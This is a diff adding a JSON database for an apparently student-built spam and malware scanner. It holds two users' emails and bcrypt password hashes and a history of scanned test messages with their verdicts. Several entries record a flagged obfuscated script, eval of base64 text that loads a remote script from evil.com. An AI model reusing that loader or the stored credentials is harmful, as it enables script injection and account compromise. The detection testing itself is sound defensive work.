@@ -1,0 +1,927 @@
+{
+  "users_db": {
+    "thughunter123@gmail.com": {
+      "id": "user_1",
+      "email": "thughunter123@gmail.com",
+      "name": "bcd",
+      "password": "$2b$12$KDUamYArsWF5t1J8.mOaA.3dJvQhEav9SxreAQljy84HT4tJP2fYG"
+    },
+    "tuankhoidau@gmail.com": {
+      "id": "user_2",
+      "email": "tuankhoidau@gmail.com",
+      "name": "tk",
+      "password": "$2b$12$FMrP81wlQ9HsNy0Dz.cVHe0aNRsrQ.ZI3LFA6e2g1/d6KU97TPgUK"
+    }
+  },
+  "scan_history_db": {
+    "user_1": [
+      {
+        "id": "scan_1",
+        "type": "text",
+        "timestamp": "2026-04-16T03:06:04.970123",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Trained spam model identified the text as suspicious",
+            "Multiple suspicious patterns detected",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_2",
+        "type": "text",
+        "timestamp": "2026-04-16T03:06:11.420361",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_3",
+        "type": "text",
+        "timestamp": "2026-04-16T03:06:47.967674",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 0.6601228327266135,
+          "threatLevel": "high",
+          "reasons": [
+            "Trained spam model identified the text as suspicious",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Contains monetary amounts",
+              "Model spam probability: 66%"
+            ],
+            "safetyScore": 34
+          }
+        },
+        "preview": "Hi Nick. This is to remind you about the $75 minim..."
+      }
+    ],
+    "user_2": [
+      {
+        "id": "scan_1",
+        "type": "text",
+        "timestamp": "2026-04-16T04:04:46.450339",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_2",
+        "type": "text",
+        "timestamp": "2026-04-16T06:37:10.203149",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_3",
+        "type": "text",
+        "timestamp": "2026-04-16T06:37:18.058379",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_4",
+        "type": "text",
+        "timestamp": "2026-04-16T06:37:29.796451",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 0.55,
+          "threatLevel": "medium",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"URGENT\"",
+              "Spam keyword detected: \"suspended\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs"
+            ],
+            "safetyScore": 45
+          }
+        },
+        "preview": "URGENT: Your account has been suspended due to sus..."
+      },
+      {
+        "id": "scan_5",
+        "type": "text",
+        "timestamp": "2026-04-16T06:37:32.106801",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 0.55,
+          "threatLevel": "medium",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"URGENT\"",
+              "Spam keyword detected: \"suspended\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs"
+            ],
+            "safetyScore": 45
+          }
+        },
+        "preview": "URGENT: Your account has been suspended due to sus..."
+      },
+      {
+        "id": "scan_6",
+        "type": "text",
+        "timestamp": "2026-04-16T06:37:42.079437",
+        "result": {
+          "isSpam": false,
+          "isMalware": true,
+          "confidence": 0.5,
+          "threatLevel": "medium",
+          "reasons": [
+            "Content contains malicious code patterns",
+            "Embedded script or executable indicators were detected",
+            "Multiple suspicious patterns were detected during analysis"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Malicious pattern detected: \"<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==\"))</script>\"",
+              "Malicious pattern detected: \"eval(\""
+            ],
+            "riskFactors": [],
+            "safetyScore": 50
+          }
+        },
+        "preview": "<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWx..."
+      },
+      {
+        "id": "scan_7",
+        "type": "text",
+        "timestamp": "2026-04-16T06:38:13.026053",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_8",
+        "type": "text",
+        "timestamp": "2026-04-16T06:38:21.273710",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.9532212976462093,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 95%"
+            ],
+            "safetyScore": 95
+          }
+        },
+        "preview": "Dear Sarah,\n\nThank you for your inquiry. I have re..."
+      },
+      {
+        "id": "scan_9",
+        "type": "text",
+        "timestamp": "2026-04-16T06:38:25.548046",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_10",
+        "type": "text",
+        "timestamp": "2026-04-16T06:40:00.822947",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_11",
+        "type": "text",
+        "timestamp": "2026-04-16T06:40:13.687857",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_12",
+        "type": "text",
+        "timestamp": "2026-04-16T06:40:36.692907",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_13",
+        "type": "text",
+        "timestamp": "2026-04-16T06:40:40.808749",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_14",
+        "type": "text",
+        "timestamp": "2026-04-16T06:42:06.213336",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 0.55,
+          "threatLevel": "medium",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"URGENT\"",
+              "Spam keyword detected: \"suspended\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs"
+            ],
+            "safetyScore": 45
+          }
+        },
+        "preview": "URGENT: Your account has been suspended due to sus..."
+      },
+      {
+        "id": "scan_15",
+        "type": "text",
+        "timestamp": "2026-04-16T06:42:29.371682",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.9532212976462093,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 95%"
+            ],
+            "safetyScore": 95
+          }
+        },
+        "preview": "Dear Sarah,\n\nThank you for your inquiry. I have re..."
+      },
+      {
+        "id": "scan_16",
+        "type": "text",
+        "timestamp": "2026-04-16T06:42:34.206374",
+        "result": {
+          "isSpam": false,
+          "isMalware": true,
+          "confidence": 0.5,
+          "threatLevel": "medium",
+          "reasons": [
+            "Content contains malicious code patterns",
+            "Embedded script or executable indicators were detected",
+            "Multiple suspicious patterns were detected during analysis"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Malicious pattern detected: \"<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==\"))</script>\"",
+              "Malicious pattern detected: \"eval(\""
+            ],
+            "riskFactors": [],
+            "safetyScore": 50
+          }
+        },
+        "preview": "<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWx..."
+      },
+      {
+        "id": "scan_17",
+        "type": "text",
+        "timestamp": "2026-04-16T06:46:33.529202",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_18",
+        "type": "text",
+        "timestamp": "2026-04-16T06:47:30.126731",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 1.0,
+          "threatLevel": "critical",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics",
+            "Urgency, prize, or account-verification language was detected",
+            "Multiple suspicious patterns were detected during analysis",
+            "Contains several risk factors"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Spam keyword detected: \"WON\"",
+              "Spam keyword detected: \"LOTTERY\"",
+              "Spam keyword detected: \"claim\"",
+              "Spam keyword detected: \"prize\"",
+              "Spam keyword detected: \"Click here\"",
+              "Spam keyword detected: \"limited time\""
+            ],
+            "riskFactors": [
+              "Contains suspicious or shortened URLs",
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts"
+            ],
+            "safetyScore": 0
+          }
+        },
+        "preview": "CONGRATULATIONS!!! You have WON $1,000,000 in our ..."
+      },
+      {
+        "id": "scan_19",
+        "type": "text",
+        "timestamp": "2026-04-16T06:49:21.602974",
+        "result": {
+          "isSpam": false,
+          "isMalware": true,
+          "confidence": 0.5,
+          "threatLevel": "medium",
+          "reasons": [
+            "Content contains malicious code patterns",
+            "Embedded script or executable indicators were detected",
+            "Multiple suspicious patterns were detected during analysis"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Malicious pattern detected: \"<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==\"))</script>\"",
+              "Malicious pattern detected: \"eval(\""
+            ],
+            "riskFactors": [],
+            "safetyScore": 50
+          }
+        },
+        "preview": "<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWx..."
+      },
+      {
+        "id": "scan_20",
+        "type": "text",
+        "timestamp": "2026-09-27T08:08:26.272386",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_21",
+        "type": "text",
+        "timestamp": "2026-10-05T08:27:25.329739",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.8282842567641817,
+          "threatLevel": "safe",
+          "reasons": [
+            "Contains several risk factors",
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Contains monetary amounts",
+              "Model safe confidence: 83%"
+            ],
+            "safetyScore": 83
+          }
+        },
+        "preview": "t\u00e0i kh\u1ecfan nh\u1eadn ti\u1ec1n l\u00e0 $100000000000000000"
+      },
+      {
+        "id": "scan_22",
+        "type": "text",
+        "timestamp": "2026-10-05T08:28:12.382858",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.7550118896572355,
+          "threatLevel": "low",
+          "reasons": [
+            "Contains several risk factors",
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Multiple exclamation marks (common in spam)",
+              "Contains monetary amounts",
+              "Model safe confidence: 76%"
+            ],
+            "safetyScore": 76
+          }
+        },
+        "preview": "T\u00e0i kho\u1ea3n c\u1ee7a b\u1ea1n nh\u1eadn \u0111\u01b0\u1ee3c l\u00e0 $100.000.000!! Ch\u00fac..."
+      },
+      {
+        "id": "scan_23",
+        "type": "text",
+        "timestamp": "2026-10-05T08:29:17.532590",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.0,
+          "threatLevel": "safe",
+          "reasons": [
+            "No spam or malware indicators were detected",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [],
+            "safetyScore": 100
+          }
+        },
+        "preview": "https://www.google.com/goto?url=CAESTAHrOzAVdQouE2..."
+      },
+      {
+        "id": "scan_24",
+        "type": "text",
+        "timestamp": "2026-10-05T08:29:18.513436",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.0,
+          "threatLevel": "safe",
+          "reasons": [
+            "No spam or malware indicators were detected",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [],
+            "safetyScore": 100
+          }
+        },
+        "preview": "https://www.google.com/goto?url=CAESTAHrOzAVdQouE2..."
+      },
+      {
+        "id": "scan_25",
+        "type": "text",
+        "timestamp": "2026-10-05T08:29:21.363779",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.0,
+          "threatLevel": "safe",
+          "reasons": [
+            "No spam or malware indicators were detected",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [],
+            "safetyScore": 100
+          }
+        },
+        "preview": "https://www.google.com/goto?url=CAESTAHrOzAVdQouE2..."
+      },
+      {
+        "id": "scan_26",
+        "type": "text",
+        "timestamp": "2026-10-05T08:29:58.227683",
+        "result": {
+          "isSpam": true,
+          "isMalware": false,
+          "confidence": 0.5069146535159899,
+          "threatLevel": "medium",
+          "reasons": [
+            "Message shows strong spam or phishing characteristics"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model spam probability: 51%"
+            ],
+            "safetyScore": 49
+          }
+        },
+        "preview": "https://hentaivietsub.com/"
+      },
+      {
+        "id": "scan_27",
+        "type": "text",
+        "timestamp": "2026-10-05T08:30:57.003095",
+        "result": {
+          "isSpam": false,
+          "isMalware": true,
+          "confidence": 0.5,
+          "threatLevel": "medium",
+          "reasons": [
+            "Content contains malicious code patterns",
+            "Embedded script or executable indicators were detected",
+            "Multiple suspicious patterns were detected during analysis"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Malicious pattern detected: \"<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==\"))</script>\"",
+              "Malicious pattern detected: \"eval(\""
+            ],
+            "riskFactors": [],
+            "safetyScore": 50
+          }
+        },
+        "preview": "<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWx..."
+      },
+      {
+        "id": "scan_28",
+        "type": "text",
+        "timestamp": "2026-10-05T08:33:43.042052",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.6283505145608494,
+          "threatLevel": "low",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 63%"
+            ],
+            "safetyScore": 63
+          }
+        },
+        "preview": "\n://google.com-sharing-view[.]tk"
+      },
+      {
+        "id": "scan_29",
+        "type": "text",
+        "timestamp": "2026-10-05T08:33:59.643496",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.7741550337122443,
+          "threatLevel": "low",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 77%"
+            ],
+            "safetyScore": 77
+          }
+        },
+        "preview": "\nwindow.location.href"
+      },
+      {
+        "id": "scan_30",
+        "type": "text",
+        "timestamp": "2026-10-05T08:34:12.064122",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.7507260115159444,
+          "threatLevel": "low",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 75%"
+            ],
+            "safetyScore": 75
+          }
+        },
+        "preview": "\nconsole.log(\"Test\")"
+      },
+      {
+        "id": "scan_31",
+        "type": "text",
+        "timestamp": "2026-10-05T08:35:35.795339",
+        "result": {
+          "isSpam": false,
+          "isMalware": false,
+          "confidence": 0.982899578293418,
+          "threatLevel": "safe",
+          "reasons": [
+            "Trained spam model classified the text as safe",
+            "Content appears safe"
+          ],
+          "details": {
+            "suspiciousPatterns": [],
+            "riskFactors": [
+              "Model safe confidence: 98%"
+            ],
+            "safetyScore": 98
+          }
+        },
+        "preview": "Hi team,\n\nJust a reminder about our meeting schedu..."
+      },
+      {
+        "id": "scan_32",
+        "type": "text",
+        "timestamp": "2026-10-05T08:38:01.317638",
+        "result": {
+          "isSpam": false,
+          "isMalware": true,
+          "confidence": 0.5,
+          "threatLevel": "medium",
+          "reasons": [
+            "Content contains malicious code patterns",
+            "Embedded script or executable indicators were detected",
+            "Multiple suspicious patterns were detected during analysis"
+          ],
+          "details": {
+            "suspiciousPatterns": [
+              "Malicious pattern detected: \"<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS9tYWx3YXJlLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==\"))</script>\"",
+              "Malicious pattern detected: \"eval(\""
+            ],
+            "riskFactors": [],
+            "safetyScore": 50
+          }
+        },
+        "preview": "<script>eval(atob(\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWx..."
+      }
+    ]
+  }
+}
